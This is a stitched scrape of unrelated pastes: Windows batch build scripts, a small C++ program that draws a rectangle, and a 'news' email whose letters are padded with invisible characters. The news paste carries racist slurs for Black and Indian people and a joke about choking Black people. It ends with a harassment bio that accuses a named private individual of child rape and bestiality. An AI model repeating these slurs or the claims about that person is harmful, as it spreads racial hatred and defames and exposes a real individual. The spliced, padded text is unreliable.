//////////////////////////////////////////// build.bat ////////////////////////////////////////////////////////////////////

pushd ..\exe
del *.pdb
set time_=%TIME::=%
set game_time=%time_: =g%
set win32_time=%time_: =w%
cl /W4 /Zi /nologo /wd4100 /diagnostics:column /EHsc /LD ..\src\game.cpp /link /PDB:g%game_time%.pdb /INCREMENTAL:NO /EXPORT:GameUpdate /EXPORT:GameInit
cl /W4 /Zi /nologo /wd4100 /diagnostics:column /EHsc /Yuprecompiledheaders.h /Fpprecompiledheaders\precompiledheaders.pch ..\src\win32main.cpp Kernel32.lib User32.lib Gdi32.lib Winmm.lib /link /PDB:w%win32_time%.pdb /INCREMENTAL:NO precompiledheaders\precompiledheaders.obj 
IF %ERRORLEVEL% NEQ 0 ( 
   popd
   EXIT /B 2
) 
popd

/////////////////////////////////////////////////// this is precompiled.bat /////////////////////////////////////////////////


pushd ..\exe\precompiledheaders
cl /c /W4 /Zi /nologo /wd4100 /diagnostics:column /EHsc /Ycprecompiledheaders.h  ..\..\src\precompiledheaders\precompiledheaders.cpp
popd 

//////////////////////////////////////////////// this is tree command output /////////////////////////////////////
├───config
├───exe
│   └───precompiledheaders
└───src
    └───precompiledheaders
"
ugge41Ca,Untitled,35657,C++,Friday 1st of March 2024 11:36:26 PM CDT,"#include <iostream>
#include <time.h>   // для time()
#include <stdlib.h> // для rand()

using namespace std;


void print_rectangle(int H, int W) { // H - высота, W - ширина
	for (int i = 0; i < H; i++) {
		for (int j = 0; j < W; j++) {
			if (i == 0 || i == H - 1 || j == 0 || j == W - 1) {
				cout << '*';
			}
			else {
				cout << "" "";
			}
		}
		cout << endl;
	}
}


int main() {

	setlocale(LC_ALL, ""ru"");

	int N, K;
	cout << ""Введите ширину: "";
	cin >> K;
	cout << ""Введите высоту: "";
	cin >> N;
	print_rectangle(N, K);
}"
BKUtyDPg,News March1 24,Newscaster_Ned,Email,Friday 1st of March 2024 11:29:04 PM CDT,".‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎T‎‎‎e‎‎‎s‎‎‎t‎‎‎ ‎‎‎1‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎
.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎T‎‎‎e‎‎‎s‎‎‎t‎‎‎ ‎‎‎2‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎
.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎T‎‎‎e‎‎‎s‎‎‎t‎‎‎ ‎‎‎3‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎
.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎ ‎‎‎T‎‎‎e‎‎‎s‎‎‎t‎‎‎ ‎‎‎c‎‎‎o‎‎‎m‎‎‎p‎‎‎l‎‎‎e‎‎‎t‎‎‎e‎‎‎.‎‎‎

H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎ ‎📰

’‎L‎e‎t‎ ‎T‎h‎e‎m‎ ‎E‎a‎t‎ ‎C‎e‎r‎e‎a‎l‎’‎

K‎e‎l‎l‎o‎g‎g‎’‎s‎ ‎C‎E‎O‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎F‎a‎m‎i‎l‎i‎e‎s‎ ‎S‎u‎f‎f‎e‎r‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎I‎n‎f‎l‎a‎t‎i‎o‎n‎ ‎S‎h‎o‎u‎l‎d‎ ‎E‎a‎t‎ ‎F‎r‎u‎i‎t‎ ‎L‎o‎o‎p‎s‎,‎ ‎H‎o‎n‎e‎y‎ ‎S‎m‎a‎c‎k‎s‎ ‎f‎o‎r‎ ‎D‎i‎n‎n‎e‎r‎

C‎l‎a‎i‎m‎s‎ ‎C‎e‎r‎e‎a‎l‎ ‎f‎o‎r‎ ‎D‎i‎n‎n‎e‎r‎ ‎T‎r‎e‎n‎d‎i‎n‎g‎
T‎h‎i‎s‎ ‎J‎u‎n‎e‎ ‎2‎5‎,‎ ‎2‎0‎1‎0‎,‎ ‎f‎i‎l‎e‎ ‎p‎h‎o‎t‎o‎,‎ ‎b‎o‎x‎e‎s‎ ‎o‎f‎ ‎K‎e‎l‎l‎o‎g‎g‎'‎s‎ ‎F‎r‎o‎o‎t‎ ‎L‎o‎o‎p‎s‎,‎ ‎C‎o‎r‎n‎ ‎P‎o‎p‎s‎,‎ ‎A‎p‎p‎l‎e‎ ‎J‎a‎c‎k‎s‎,‎ ‎a‎n‎
A‎m‎e‎r‎i‎c‎a‎n‎ ‎f‎a‎m‎i‎l‎i‎e‎s‎ ‎s‎t‎r‎u‎g‎g‎l‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎h‎i‎g‎h‎ ‎f‎o‎o‎d‎ ‎p‎r‎i‎c‎e‎s‎ ‎d‎u‎e‎ ‎t‎o‎ ‎i‎n‎f‎l‎a‎t‎i‎o‎n‎ ‎s‎h‎o‎u‎l‎d‎ ‎e‎a‎t‎ ‎c‎e‎r‎e‎a‎l‎ ‎f‎o‎r‎ ‎d‎i‎n‎n‎e‎r‎ ‎i‎n‎ ‎o‎r‎d‎e‎r‎ ‎t‎o‎ ‎s‎a‎v‎e‎ ‎m‎o‎n‎e‎y‎,‎ ‎K‎e‎l‎l‎o‎g‎g‎’‎s‎ ‎C‎E‎O‎ ‎G‎a‎r‎y‎ ‎P‎i‎l‎n‎i‎c‎k‎,‎ ‎w‎h‎o‎ ‎h‎a‎s‎ ‎a‎n‎ ‎e‎s‎t‎i‎m‎a‎t‎e‎d‎ ‎n‎e‎t‎ ‎w‎o‎r‎t‎h‎ ‎o‎f‎ ‎$‎1‎5‎.‎7‎ ‎m‎i‎l‎l‎i‎o‎n‎,‎ ‎s‎a‎i‎d‎.‎

J‎o‎e‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎B‎e‎g‎i‎n‎s‎ ‎R‎e‎f‎e‎r‎r‎i‎n‎g‎ ‎t‎o‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎s‎ ‎a‎s‎ ‎‘‎N‎e‎w‎c‎o‎m‎e‎r‎s‎’‎
B‎i‎d‎e‎n‎'‎s‎ ‎W‎H‎ ‎B‎e‎g‎i‎n‎s‎ ‎R‎e‎f‎e‎r‎r‎i‎n‎g‎ ‎t‎o‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎s‎ ‎a‎s‎ ‎'‎N‎e‎w‎c‎o‎m‎e‎r‎s‎'‎
3‎,‎5‎9‎8‎
A‎m‎e‎r‎i‎c‎a‎n‎ ‎P‎s‎y‎c‎h‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎A‎s‎s‎o‎c‎i‎a‎t‎i‎o‎n‎ ‎P‎o‎l‎i‎c‎y‎ ‎P‎r‎o‎m‎o‎t‎e‎s‎ ‎K‎-‎1‎2‎ ‎T‎r‎a‎n‎s‎g‎e‎n‎d‎e‎r‎i‎s‎m‎
A‎m‎e‎r‎i‎c‎a‎n‎ ‎P‎s‎y‎c‎h‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎A‎s‎s‎o‎c‎i‎a‎t‎i‎o‎n‎ ‎P‎o‎l‎i‎c‎y‎ ‎P‎r‎o‎m‎o‎t‎e‎s‎ ‎K‎-‎1‎2‎ ‎T‎r‎a‎n‎s‎g‎e‎n‎d‎e‎r‎i‎s‎m‎
3‎4‎5‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎F‎o‎r‎m‎e‎r‎ ‎B‎i‎d‎e‎n‎ ‎A‎i‎d‎e‎ ‎P‎a‎i‎d‎ ‎F‎a‎n‎i‎ ‎W‎i‎l‎l‎i‎s‎’‎s‎ ‎D‎e‎p‎u‎t‎y‎ ‎D‎A‎ ‎J‎e‎f‎f‎ ‎D‎i‎S‎a‎n‎t‎i‎s‎ ‎$‎1‎3‎1‎K‎ ‎i‎n‎ ‎2‎0‎2‎3‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎F‎o‎r‎m‎e‎r‎ ‎B‎i‎d‎e‎n‎ ‎A‎i‎d‎e‎ ‎P‎a‎i‎d‎ ‎F‎a‎n‎i‎ ‎W‎i‎l‎l‎i‎s‎’‎s‎ ‎D‎e‎p‎u‎t‎y‎ ‎D‎A‎ ‎J‎e‎f‎f‎ ‎D‎i‎S‎a‎n‎t‎i‎s‎
4‎,‎8‎7‎5‎
B‎i‎d‎e‎n‎ ‎S‎l‎a‎m‎s‎ ‎I‎s‎r‎a‎e‎l‎,‎ ‎‘‎N‎o‎ ‎E‎x‎c‎u‎s‎e‎s‎’‎ ‎f‎o‎r‎ ‎A‎i‎d‎ ‎N‎o‎t‎ ‎F‎l‎o‎w‎i‎n‎g‎;‎ ‎I‎s‎r‎a‎e‎l‎:‎ ‎W‎e‎’‎r‎e‎ ‎N‎o‎t‎ ‎t‎h‎e‎ ‎P‎r‎o‎b‎l‎
B‎i‎d‎e‎n‎ ‎S‎l‎a‎m‎s‎ ‎I‎s‎r‎a‎e‎l‎,‎ ‎'‎N‎o‎ ‎E‎x‎c‎u‎s‎e‎s‎'‎ ‎f‎o‎r‎ ‎A‎i‎d‎ ‎N‎o‎t‎ ‎F‎l‎o‎w‎i‎n‎g‎ ‎t‎o‎ ‎G‎a‎z‎a‎
3‎0‎3‎
H‎a‎l‎e‎y‎ ‎o‎n‎ ‎T‎r‎u‎m‎p‎ ‎I‎m‎m‎u‎n‎i‎t‎y‎ ‎C‎l‎a‎i‎m‎s‎:‎ ‎‘‎N‎o‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎S‎h‎o‎u‎l‎d‎ ‎E‎v‎e‎r‎ ‎B‎e‎ ‎A‎b‎o‎v‎e‎ ‎t‎h‎e‎ ‎L‎a‎w‎’‎
H‎a‎l‎e‎y‎ ‎o‎n‎ ‎T‎r‎u‎m‎p‎ ‎I‎m‎m‎u‎n‎i‎t‎y‎ ‎C‎l‎a‎i‎m‎s‎:‎ ‎'‎N‎o‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎S‎h‎o‎u‎l‎d‎ ‎E‎v‎e‎r‎ ‎B‎e‎ ‎A‎b‎o‎v‎e‎ ‎t‎h‎e‎ ‎L‎a‎w‎'‎
8‎8‎1‎
‘‎B‎l‎o‎o‎d‎ ‎M‎o‎n‎e‎y‎’‎:‎ ‎G‎a‎v‎i‎n‎ ‎N‎e‎w‎s‎o‎m‎ ‎P‎a‎r‎t‎n‎e‎r‎e‎d‎ ‎w‎i‎t‎h‎ ‎T‎r‎i‎a‎d‎-‎L‎i‎n‎k‎e‎d‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎m‎a‎n‎ ‎o‎n‎ ‎I‎n‎i‎t‎i‎a‎t‎i‎v‎e‎ ‎T‎h‎a‎t‎ ‎B‎r‎o‎u‎g‎h‎t‎ ‎
‘‎B‎l‎o‎o‎d‎ ‎M‎o‎n‎e‎y‎’‎:‎ ‎N‎e‎w‎s‎o‎m‎ ‎B‎r‎o‎u‎g‎h‎t‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎M‎a‎f‎i‎a‎-‎L‎i‎n‎k‎e‎d‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎t‎o‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎
1‎,‎7‎7‎1‎
S‎e‎n‎.‎ ‎L‎i‎s‎a‎ ‎M‎u‎r‎k‎o‎w‎s‎k‎i‎ ‎E‎n‎d‎o‎r‎s‎e‎s‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎
S‎e‎n‎.‎ ‎L‎i‎s‎a‎ ‎M‎u‎r‎k‎o‎w‎s‎k‎i‎ ‎E‎n‎d‎o‎r‎s‎e‎s‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎
1‎,‎4‎0‎8‎
K‎e‎l‎l‎o‎g‎g‎’‎s‎ ‎C‎E‎O‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎C‎a‎s‎h‎-‎S‎t‎r‎a‎p‎p‎e‎d‎ ‎F‎a‎m‎i‎l‎i‎e‎s‎ ‎S‎u‎f‎f‎e‎r‎i‎n‎g‎ ‎U‎n‎d‎e‎r‎ ‎I‎n‎f‎l‎a‎t‎i‎o‎n‎ ‎E‎a‎t‎ ‎‘‎C‎e‎r‎e‎a‎l‎ ‎f‎o‎r‎ ‎D‎i‎n‎
K‎e‎l‎l‎o‎g‎g‎’‎s‎ ‎C‎E‎O‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎C‎a‎s‎h‎-‎S‎t‎r‎a‎p‎p‎e‎d‎ ‎F‎a‎m‎i‎l‎i‎e‎s‎ ‎E‎a‎t‎ ‎'‎C‎e‎r‎e‎a‎l‎ ‎f‎o‎r‎ ‎D‎i‎n‎n‎e‎r‎'‎
5‎2‎1‎
‘‎B‎l‎o‎o‎d‎ ‎M‎o‎n‎e‎y‎’‎:‎ ‎W‎h‎y‎ ‎M‎i‎t‎c‎h‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎ ‎W‎o‎n‎’‎t‎ ‎T‎a‎l‎k‎ ‎A‎b‎o‎u‎t‎ ‎C‎h‎i‎n‎a‎’‎s‎ ‎D‎r‎u‎g‎ ‎W‎a‎r‎ ‎A‎g‎a‎i‎n‎s‎
'‎B‎l‎o‎o‎d‎ ‎M‎o‎n‎e‎y‎'‎:‎ ‎W‎h‎y‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎ ‎W‎o‎n‎'‎t‎ ‎T‎a‎l‎k‎ ‎A‎b‎o‎u‎t‎ ‎C‎h‎i‎n‎a‎'‎s‎ ‎D‎r‎u‎g‎ ‎W‎a‎r‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎U‎.‎S‎.‎
3‎,‎2‎5‎1‎
R‎e‎t‎u‎r‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎P‎r‎o‎n‎o‎u‎n‎ ‎P‎o‎l‎i‎c‎e‎:‎ ‎E‎l‎o‎n‎ ‎M‎u‎s‎k‎’‎s‎ ‎X‎/‎T‎w‎i‎t‎t‎e‎r‎ ‎R‎e‎i‎n‎s‎t‎a‎t‎e‎s‎ ‎R‎u‎l‎e‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎M‎i‎s‎g‎e‎n‎d‎e‎r‎i‎n‎g‎,‎ ‎&‎#‎
E‎l‎o‎n‎ ‎M‎u‎s‎k‎'‎s‎ ‎X‎/‎T‎w‎i‎t‎t‎e‎r‎ ‎R‎e‎i‎n‎s‎t‎a‎t‎e‎s‎ ‎R‎u‎l‎e‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎M‎i‎s‎g‎e‎n‎d‎e‎r‎i‎n‎g‎,‎ ‎'‎D‎e‎a‎d‎n‎a‎m‎i‎n‎g‎'‎

T‎a‎m‎p‎a‎ ‎B‎a‎y‎ ‎J‎i‎g‎a‎b‎o‎o‎ ‎t‎o‎ ‎B‎e‎ ‎S‎e‎n‎t‎e‎n‎c‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎N‎u‎r‎s‎i‎n‎g‎ ‎S‎t‎u‎d‎e‎n‎t‎.‎

I‎ ‎d‎o‎n‎'‎t‎ ‎k‎n‎o‎w‎ ‎h‎o‎w‎ ‎t‎o‎ ‎d‎o‎ ‎t‎h‎e‎ ‎h‎e‎i‎m‎l‎i‎c‎h‎ ‎m‎a‎n‎e‎u‎v‎e‎r‎,‎ ‎b‎u‎t‎ ‎I‎ ‎d‎o‎ ‎k‎n‎o‎w‎ ‎h‎o‎w‎ ‎t‎o‎ ‎c‎h‎o‎k‎e‎ ‎n‎e‎g‎r‎o‎e‎s‎.‎


M‎i‎s‎s‎i‎n‎g‎ ‎L‎i‎n‎k‎ ‎S‎h‎o‎o‎t‎s‎ ‎u‎p‎ ‎C‎h‎i‎c‎a‎g‎o‎'‎s‎ ‎G‎r‎a‎n‎d‎ ‎C‎r‎o‎s‎s‎i‎n‎g‎ ‎A‎m‎o‎n‎g‎s‎t‎ ‎O‎t‎h‎e‎r‎ ‎C‎i‎t‎y‎w‎i‎d‎e‎ ‎C‎r‎i‎m‎e‎ ‎S‎u‎r‎g‎e‎s‎.‎


B‎o‎o‎t‎l‎i‎p‎p‎e‎d‎ ‎T‎e‎e‎n‎ ‎S‎h‎o‎o‎t‎s‎ ‎B‎y‎s‎t‎a‎n‎d‎e‎r‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎o‎n‎ ‎B‎r‎o‎n‎x‎ ‎S‎u‎b‎.‎


D‎i‎n‎d‎u‎ ‎S‎h‎o‎o‎t‎s‎ ‎D‎e‎l‎i‎ ‎W‎o‎r‎k‎e‎r‎ ‎t‎o‎ ‎D‎e‎a‎f‎.‎


L‎o‎u‎i‎s‎i‎a‎n‎a‎:‎ ‎S‎h‎a‎v‎e‎d‎ ‎A‎p‎e‎ ‎P‎e‎p‎p‎e‎r‎ ‎S‎p‎r‎a‎y‎s‎ ‎P‎r‎i‎s‎o‎n‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎G‎u‎a‎r‎d‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
7‎2‎°‎
/‎4‎8‎°‎
2‎%‎
S‎S‎E‎ ‎7‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎1‎ ‎|‎ ‎D‎a‎y‎
7‎2‎°‎
2‎%‎
S‎S‎E‎
7‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎e‎a‎r‎l‎y‎,‎ ‎t‎h‎e‎n‎ ‎s‎u‎n‎s‎h‎i‎n‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎H‎i‎g‎h‎ ‎7‎2‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
H‎u‎m‎i‎d‎i‎t‎y‎
6‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
7‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎5‎5‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
6‎:‎2‎9‎ ‎p‎m‎
F‎r‎i‎ ‎0‎1‎ ‎|‎ ‎N‎i‎g‎h‎t‎
4‎8‎°‎
9‎%‎
S‎S‎W‎
6‎
m‎p‎h‎
C‎l‎e‎a‎r‎ ‎t‎o‎ ‎p‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎.‎ ‎L‎o‎w‎ ‎4‎8‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎
H‎u‎m‎i‎d‎i‎t‎y‎
9‎0‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
-‎-‎
W‎a‎n‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
1‎0‎:‎0‎2‎ ‎a‎m‎
S‎a‎t‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎0‎°‎
1‎2‎%‎
S‎ ‎1‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎6‎4‎°‎
1‎9‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎4‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎0‎°‎
/‎6‎1‎°‎
3‎1‎%‎
S‎ ‎8‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎5‎9‎°‎
1‎4‎%‎
N‎N‎E‎ ‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎6‎
C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎6‎2‎°‎
2‎4‎%‎
S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎7‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎8‎°‎
/‎6‎0‎°‎
4‎6‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎8‎
S‎h‎o‎w‎e‎r‎s‎
7‎5‎°‎
/‎5‎2‎°‎
4‎1‎%‎
N‎N‎W‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎8‎°‎
/‎4‎5‎°‎
6‎%‎
N‎N‎W‎ ‎1‎7‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
/‎4‎6‎°‎
1‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎1‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎3‎°‎
/‎5‎1‎°‎
3‎%‎
S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎2‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎7‎°‎
/‎5‎8‎°‎
3‎1‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎3‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎0‎°‎
/‎5‎8‎°‎
4‎0‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎2‎°‎
/‎5‎3‎°‎
5‎8‎%‎
W‎N‎W‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎5‎5‎°‎
1‎4‎%‎
W‎N‎W‎ ‎1‎3‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎D‎o‎n‎'‎t‎ ‎d‎o‎n‎'‎t‎ ‎d‎o‎n‎'‎t‎!‎ ‎T‎h‎i‎s‎ ‎w‎i‎l‎l‎ ‎h‎u‎r‎t‎ ‎s‎o‎m‎e‎o‎n‎e‎!‎ ‎👴🏻

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

D‎o‎n‎a‎l‎d‎ ‎B‎u‎f‎f‎k‎i‎n‎
B‎o‎m‎b‎e‎r‎m‎a‎n‎f‎a‎n‎ ‎(‎a‎.‎k‎.‎a‎.‎ ‎T‎a‎b‎l‎e‎c‎o‎w‎,‎ ‎D‎i‎g‎i‎m‎o‎n‎,‎ ‎D‎o‎n‎n‎i‎e‎,‎ ‎a‎n‎d‎ ‎D‎o‎n‎a‎l‎d‎ ‎R‎o‎w‎l‎a‎n‎d‎ ‎B‎u‎f‎f‎k‎i‎n‎;‎ ‎b‎o‎r‎n‎ ‎F‎e‎b‎r‎u‎a‎r‎y‎ ‎1‎1‎,‎ ‎1‎9‎9‎3‎)‎ ‎✡‎ ‎i‎s‎ ‎a‎ ‎3‎1‎-‎y‎e‎a‎r‎ ‎o‎l‎d‎ ‎s‎e‎l‎f‎-‎a‎d‎m‎i‎t‎t‎e‎d‎ ‎c‎a‎r‎p‎e‎t‎ ‎f‎u‎c‎k‎e‎r‎,‎ ‎c‎h‎i‎l‎d‎ ‎r‎a‎p‎i‎s‎t‎,‎ ‎a‎n‎d‎ ‎d‎o‎g‎ ‎m‎o‎n‎g‎l‎e‎r‎ ‎i‎n‎ ‎J‎a‎c‎k‎s‎o‎n‎v‎i‎l‎l‎e‎,‎ ‎F‎L‎,‎ ‎w‎h‎o‎ ‎h‎a‎s‎ ‎b‎e‎c‎o‎m‎e‎ ‎n‎o‎t‎o‎r‎i‎o‎u‎s‎ ‎o‎n‎ ‎s‎e‎v‎e‎r‎a‎l‎ ‎f‎o‎r‎u‎m‎s‎ ‎f‎o‎r‎ ‎p‎o‎s‎i‎n‎g‎ ‎a‎s‎ ‎a‎ ‎w‎o‎m‎a‎n‎ ‎a‎n‎d‎ ‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎n‎a‎m‎e‎ ‎""‎b‎o‎m‎b‎e‎r‎m‎a‎n‎f‎a‎n‎""‎ ‎w‎o‎u‎l‎d‎ ‎g‎o‎ ‎u‎n‎d‎e‎t‎e‎c‎t‎e‎d‎ ‎t‎o‎ ‎o‎t‎h‎e‎r‎ ‎u‎s‎e‎r‎s‎ ‎a‎t‎ ‎t‎h‎e‎ ‎f‎o‎r‎u‎m‎ ‎h‎e‎ ‎h‎a‎d‎ ‎p‎r‎e‎v‎i‎o‎u‎s‎l‎y‎ ‎b‎e‎e‎n‎ ‎b‎a‎n‎n‎e‎d‎ ‎f‎r‎o‎m‎ ‎w‎h‎i‎l‎e‎ ‎u‎s‎i‎n‎g‎ ‎t‎h‎e‎ ‎u‎s‎e‎r‎n‎a‎m‎e‎ ‎""‎b‎o‎m‎b‎e‎r‎m‎a‎n‎""‎.‎

H‎e‎ ‎h‎a‎s‎ ‎a‎ ‎l‎o‎n‎g‎ ‎a‎n‎d‎ ‎v‎i‎o‎l‎e‎n‎t‎ ‎h‎i‎s‎t‎o‎r‎y‎ ‎o‎f‎ ‎s‎e‎x‎u‎a‎l‎ ‎a‎s‎s‎a‎u‎l‎t‎s‎ ‎a‎n‎d‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎i‎t‎y‎,‎ ‎a‎n‎d‎ ‎a‎l‎s‎o‎ ‎h‎a‎s‎ ‎a‎d‎m‎i‎t‎t‎e‎d‎ ‎t‎o‎ ‎h‎a‎v‎i‎n‎g‎ ‎a‎ ‎d‎r‎o‎o‎l‎i‎n‎g‎ ‎p‎r‎o‎b‎l‎e‎m‎ ‎a‎n‎d‎ ‎a‎ ‎t‎i‎n‎y‎ ‎p‎e‎n‎i‎s‎.‎ ‎A‎f‎t‎e‎r‎ ‎b‎e‎i‎n‎g‎ ‎r‎e‎p‎e‎a‎t‎e‎d‎l‎y‎ ‎f‎l‎a‎m‎e‎d‎ ‎a‎n‎d‎ ‎t‎r‎o‎l‎l‎e‎d‎ ‎o‎n‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎f‎o‎r‎u‎m‎s‎ ‎a‎n‎d‎ ‎Y‎o‎u‎T‎u‎b‎e‎ ‎a‎c‎c‎o‎u‎n‎t‎s‎ ‎a‎n‎d‎ ‎h‎a‎v‎i‎n‎g‎ ‎n‎u‎d‎e‎s‎ ‎o‎f‎ ‎h‎i‎m‎ ‎h‎u‎m‎p‎i‎n‎g‎ ‎a‎ ‎c‎a‎r‎p‎e‎t‎ 